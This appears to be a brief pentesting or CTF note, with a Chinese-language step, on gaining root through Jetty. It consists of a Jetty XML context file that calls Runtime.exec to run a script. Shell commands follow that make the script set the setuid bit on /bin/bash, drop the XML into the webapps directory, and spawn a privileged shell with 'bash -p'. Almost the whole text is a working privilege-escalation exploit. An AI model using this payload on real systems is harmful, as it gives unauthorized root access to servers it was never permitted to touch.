https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html?highlight=jetty#jetty-rce

https://github.com/Mike-n1/tips/blob/main/JettyShell.xml?source=post_page-----555ce2d9234e--------------------------------

```
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
    <Call class="java.lang.Runtime" name="getRuntime">
        <Call name="exec">
            <Arg>
                <Array type="String">
                    <Item>/bin/sh</Item>
                    <Item>-c</Item>
                    <Item>/tmp/root.sh</Item>
                </Array>
            </Arg>
        </Call>
    </Call>
</Configure>
```

我们在复制以下内容到jetty/webapp目录下

```
find / -type f -iname "jetty.*" 2>/dev/null
cd /opt/jetty/jetty-base/webapps
echo "chmod +xs /bin/bash" > /tmp/root.sh
chmod +x /tmp/root.sh
vi root.xml
bash -p
```
